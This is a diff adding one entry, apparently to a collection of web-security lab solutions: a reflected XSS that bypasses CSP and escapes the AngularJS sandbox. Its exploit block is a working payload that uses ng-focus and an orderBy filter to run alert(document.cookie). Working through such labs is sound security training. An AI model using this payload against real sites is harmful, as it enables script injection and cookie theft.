@@ -337,8 +337,17 @@ You Have a Search Funtion and search like asif and intercept the request and san
  
  
  
+ ## 13. Reflected XSS with AngularJS sandbox escape and CSP
  
+ This website uses CSP and AngularJS. 
  
+ perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alerts document.cookie
+ 
+ ## EXPLOIT 
+ 
+     <script>
+     location='https://your-lab-id.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
+     </script>
  
  
  
